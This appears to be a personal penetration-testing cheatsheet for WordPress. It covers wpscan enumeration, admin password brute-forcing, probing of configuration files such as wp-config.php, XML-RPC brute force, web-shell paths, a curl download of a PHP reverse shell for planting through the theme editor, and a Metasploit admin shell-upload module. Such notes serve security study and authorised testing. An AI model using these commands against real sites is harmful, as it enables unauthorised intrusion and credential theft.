# Wordpress 

Checklist:
- Login page
- `robots.txt`
- `/var/www/html/wp-config.php` contain credentials
- Enumerate users with `-u` with `wpscan`

## Cheatsheet

[Free 25 API requests per day](https://wpscan.com/pricing)

```bash
# -e not argument - default is vp,vt,tt,cb,dbe,u,m
wpscan --url $url --rua -e --api-token $APIKEY # -o filename
# optional - all plugins, themes, plus timthumbs
# vp,vt,tt,cb,dbe,u,m
ap at t tt dbe u m cb

# Output to file
-o 

# Brute forcing Admin user
wpscan --url $url --api-token $APIKEY -U admin -P /usr/share/wordlists/rockyou.txt

# Weird TLS issues
--disable-tls-checks
```


#### Scanning and Enumeration 

```bash
# Username can be guessed on WordPress since the username will generate a different error message if it doesn't exist.

# Interesting files
https://monsite.com/robots.txt
https://monsite.com/feed
https://monsite.com/readme.html
https://monsite.com/xmlrpc.php

# Configuration files
https://monsite.com/.htaccess
https://monsite.com/wp-config.php

# Directory listing
https://monsite.com/wp-includes

# XML-RPC attack (https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit)
# You can bruteforce users
./wp-xml-brute http://target.com/xmlrpc.php passwords.txt username1

# If by any way you can upload files, go check /upload or /uploads for your files

# Get WPEngine's config file
/_wpeprivate/config.json
```

#### Directory  Busting 

Seclist wordlists
```bash
/usr/share/wordlists/seclists/Discovery/Web-Content/URLs/urls-wordpress-3.3.1.txt
/usr/share/wordlists/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt
/usr/share/wordlists/seclists/Passwords/Honeypot-Captures/wordpress-attacks-july2014.txt
```

#### Shells
Seclists
```bash
/usr/share/wordlists/seclists/Web-Shells/WordPress
/usr/share/wordlists/Web-Shells/laudanum-1.0/wordpress/templates/shell.php
```

#### Reverse Shells

```bash
# You can reverse shell by editing templates (404.php, footer.php...)
# Theme Editor use a 404 template as it won't break the site.
# Plugin Editor then go to /wp-content/plugins/<pluginname.php>
# Beware Theme must be active 
curl -L https://raw.githubusercontent.com/jbarcia/Web-Shells/master/laudanum/wordpress/templates/php-reverse-shell.php -o php-reverse-shell.php
```



[[Metasploit]] - Minor improvements from https://www.hackingarticles.in/wordpress-reverse-shell/
```ruby
msfconsole -q -x 'use exploit/unix/webapp/wp_admin_shell_upload'
set RHOST domain.tld
set USERNAME admin
set PASSWORD admin
set targeturi /wordpress
exploit
```
For example the modifying the 404.php page for the twentyfifteen theme will located:
```php
/wordpress/wp-content/themes/twentyfifteen/404.php
```

#### Hashes
```bash
# Hashcat Hashmode = 400
```


## References

[haax.fr](https://cheatsheet.haax.fr/web-pentest/content-management-system-cms/wordpress/)
[hackingarticles - wordpress reverse shell](https://www.hackingarticles.in/wordpress-reverse-shell/)